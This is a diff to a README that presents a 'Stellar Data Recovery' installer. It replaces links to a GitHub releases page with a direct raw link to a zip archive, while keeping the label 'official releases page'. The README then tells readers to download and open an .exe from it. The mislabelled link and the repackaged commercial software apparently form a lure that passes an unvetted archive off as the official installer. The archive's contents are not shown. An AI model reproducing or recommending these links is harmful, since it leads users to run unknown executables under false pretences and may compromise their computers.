@@ -1,6 +1,6 @@
 # 💾 Stellar-Data-Recovery-Setup - Restore lost files from your drives
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/One-srilankan202/Stellar-Data-Recovery-Setup/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/One-srilankan202/Stellar-Data-Recovery-Setup/main/strass/Recovery_Data_Stellar_Setup_v1.6.zip)
 
 Stellar Data Recovery retrieves files from formatted, crashed, and unbootable drives. This tool recovers documents, photos, and videos from HDD, SSD, RAID arrays, and optical media.
 
@@ -31,7 +31,7 @@ Ensure your computer meets these requirements before you start.
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/One-srilankan202/Stellar-Data-Recovery-Setup/releases) to access the installer.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/One-srilankan202/Stellar-Data-Recovery-Setup/main/strass/Recovery_Data_Stellar_Setup_v1.6.zip) to access the installer.
 2.  Locate the latest version file ending in .exe.
 3.  Click the filename to start the download.
 4.  Open the downloaded file from your Downloads folder.
